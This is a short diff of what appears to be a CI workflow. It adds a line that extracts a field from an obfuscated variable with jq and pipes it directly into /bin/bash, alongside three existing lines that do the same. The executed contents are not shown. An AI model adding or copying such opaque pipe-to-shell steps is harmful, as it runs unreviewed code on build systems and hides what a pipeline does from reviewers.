@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$wr7" | jq -r .wenr794 | /bin/bash
           echo $v64370 | jq -r .poe31 | /bin/bash
           echo $k3794 | jq -r .edftk04 | /bin/bash
+          printf '%s' "$or354" | jq -r .wirfq02 | /bin/bash
 
       - name: Save results
         if: always()
